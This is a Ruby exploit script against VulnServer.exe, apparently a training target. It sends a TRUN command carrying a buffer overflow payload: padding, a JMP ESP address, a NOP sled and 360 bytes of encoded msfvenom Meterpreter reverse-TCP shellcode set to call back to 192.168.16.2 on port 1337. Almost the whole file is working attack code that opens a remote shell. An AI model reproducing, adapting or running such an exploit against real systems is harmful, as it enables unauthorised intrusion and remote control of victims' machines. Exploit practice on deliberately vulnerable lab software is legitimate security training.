#! /usr/bin/env ruby
# VulnServer.exe Exploit
# 
# Usage ./vulnserv.rb <IP> <PORT> <PAYLOAD FILE>
#
require 'socket'

# Check arguments
if ARGV.length < 3
  puts "usage #{__FILE__} <target ip> <target port> <payload file>"
  exit
end

# Create the socket
IP=ARGV[0]
PORT=ARGV[1]
FILE = ARGV[2]

puts "[+] Connecting..."
s = TCPSocket.new(IP, PORT)

# Define command
cmd = "TRUN"

# Define payload
payload = " /.:/"
#payload += File.read(FILE)
payload += "A" * 2003 # Padding
payload += "\xaf\x11\x50\x62" # JMP ESP
payload += "\x90" * 32 # NOP Sled

# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai 
#   -b "\x00\x0a\x0d" -f ruby  LHOST=192.168.16.2 LPORT=1337

payload +=  # Shellcode 360 bytes
"\xdb\xdc\xbe\xc7\xbc\xcb\x17\xd9\x74\x24\xf4\x58\x33\xc9" +
"\xb1\x54\x83\xc0\x04\x31\x70\x14\x03\x70\xd3\x5e\x3e\xeb" +
"\x33\x1c\xc1\x14\xc3\x41\x4b\xf1\xf2\x41\x2f\x71\xa4\x71" +
"\x3b\xd7\x48\xf9\x69\xcc\xdb\x8f\xa5\xe3\x6c\x25\x90\xca" +
"\x6d\x16\xe0\x4d\xed\x65\x35\xae\xcc\xa5\x48\xaf\x09\xdb" +
"\xa1\xfd\xc2\x97\x14\x12\x67\xed\xa4\x99\x3b\xe3\xac\x7e" +
"\x8b\x02\x9c\xd0\x80\x5c\x3e\xd2\x45\xd5\x77\xcc\x8a\xd0" +
"\xce\x67\x78\xae\xd0\xa1\xb1\x4f\x7e\x8c\x7e\xa2\x7e\xc8" +
"\xb8\x5d\xf5\x20\xbb\xe0\x0e\xf7\xc6\x3e\x9a\xec\x60\xb4" +
"\x3c\xc9\x91\x19\xda\x9a\x9d\xd6\xa8\xc5\x81\xe9\x7d\x7e" +
"\xbd\x62\x80\x51\x34\x30\xa7\x75\x1d\xe2\xc6\x2c\xfb\x45" +
"\xf6\x2f\xa4\x3a\x52\x3b\x48\x2e\xef\x66\x04\x83\xc2\x98" +
"\xd4\x8b\x55\xea\xe6\x14\xce\x64\x4a\xdc\xc8\x73\xad\xf7" +
"\xad\xec\x50\xf8\xcd\x25\x96\xac\x9d\x5d\x3f\xcd\x75\x9e" +
"\xc0\x18\xe3\x9b\x56\x63\x5c\xb3\xa4\x0b\x9f\xb4\xad\xf2" +
"\x16\x52\xfd\x54\x79\xcb\xbd\x04\x39\xbb\x55\x4f\xb6\xe4" +
"\x45\x70\x1c\x8d\xef\x9f\xc9\xe5\x87\x06\x50\x7d\x36\xc6" +
"\x4e\xfb\x78\x4c\x7b\xfb\x36\xa5\x0e\xef\x2e\xd4\xf0\xef" +
"\xae\x7d\xf1\x85\xaa\xd7\xa6\x31\xb0\x0e\x80\x9d\x4b\x65" +
"\x92\xda\xb3\xf8\xa3\x91\x85\x6e\x8c\xcd\xe9\x7e\x0c\x0e" +
"\xbf\x14\x0c\x66\x67\x4d\x5f\x93\x68\x58\xf3\x08\xfc\x63" +
"\xa2\xfd\x57\x0c\x48\xdb\x9f\x93\xb3\x0e\x9c\xd4\x4c\xcc" +
"\x80\x7c\x25\x2e\x84\x7c\xb5\x44\x04\x2d\xdd\x93\x2b\xc2" +
"\x2d\x5b\xe6\x8b\x25\xd6\x66\x79\xd7\xe7\xa3\xdf\x49\xe7" +
"\x47\xc4\x9c\x66\xa8\xfb\xa0\x88\x95\x2d\x99\xfe\xde\xed" +
"\x9e\xf1\x55\x53\xb6\x9b\x95\xc7\xc8\x89"

payload += "\x90" * (5000 - 2003 - 4 - 32 - 360)

# Send the payload
begin
  s.gets
  puts "[+] Sending payload.."
  s.puts(cmd + payload)
  s.gets
  puts "[-] Failed to crash the target"
  s.close
rescue Errno::ECONNRESET
  puts "[+] Crash!!"
end

